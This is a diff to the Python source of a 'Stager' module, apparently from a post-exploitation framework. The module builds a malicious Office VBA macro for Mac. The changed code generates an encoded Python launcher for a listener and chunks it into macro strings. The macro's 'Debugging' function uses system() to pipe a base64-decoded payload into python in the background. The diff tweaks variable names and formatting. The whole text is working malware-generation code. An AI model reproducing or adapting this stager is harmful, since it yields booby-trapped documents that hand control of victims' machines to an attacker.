@@ -64,9 +64,9 @@ class Stager:
             holder = []
             str1 = ''
             str2 = ''
-            str1 = varstr + ' = "' + instr[:54] + '"' 
+            str1 = varstr + ' = "' + instr[:54] + '"'
             for i in xrange(54, len(instr), 48):
-                holder.append(varstr + ' = '+ varstr +' + "'+instr[i:i+48])
+                holder.append('\t\t' + varstr + ' = '+ varstr +' + "'+instr[i:i+48])
                 str2 = '"\r\n'.join(holder)
             str2 = str2 + "\""
             str1 = str1 + "\r\n"+str2
@@ -78,17 +78,17 @@ class Stager:
         userAgent = self.options['UserAgent']['Value']
         safeChecks = self.options['SafeChecks']['Value']
 
-        # generate the launcher code
-        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=True, userAgent=userAgent, safeChecks=safeChecks)
+        # generate the python launcher code
+        pylauncher = self.mainMenu.stagers.generate_launcher(listenerName, language="python", encode=True, userAgent=userAgent, safeChecks=safeChecks)
 
-        if launcher == "":
-            print helpers.color("[!] Error in launcher command generation.")
+        if pylauncher == "":
+            print helpers.color("[!] Error in python launcher command generation.")
             return ""
 
-        else:
-            launcher = launcher.replace("\"", "\"\"")
-            for match in re.findall(r"'(.*?)'", launcher, re.DOTALL):
-                payload = formStr("cmd", match)
+        # render python launcher into python payload
+        pylauncher = pylauncher.replace("\"", "\"\"")
+        for match in re.findall(r"'(.*?)'", pylauncher, re.DOTALL):
+            payload = formStr("str", match)
 
             macro = """
 #If Mac Then
@@ -115,8 +115,6 @@ End Sub
 
 Public Function Debugging() As Variant
     On Error Resume Next
-            Dim tracking As String
-            tracking = "%s"
             #If Mac Then
                 'Mac Rendering
                 If Val(Application.Version) >= 15.33 Then
@@ -127,13 +125,13 @@ Public Function Debugging() As Variant
                     result = system("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & cmd & \" \\\"\"));"" | python &")
                 Else
                     Dim result2 As Long
-                    Dim cmd As String
+                    Dim cmd2 As String
                     %s
-                    MsgBox("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & cmd & \" \\\"\"));"" | python &")
-                    result2 = system("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & cmd & \" \\\"\"));"" | python &")
+                    MsgBox("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & cmd2 & \" \\\"\"));"" | python &")
+                    result2 = system("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & cmd2 & \" \\\"\"));"" | python &")
                 End If
 
             #End If
-End Function""" %(payload)
+End Function""" %(payload, payload)
 
             return macro
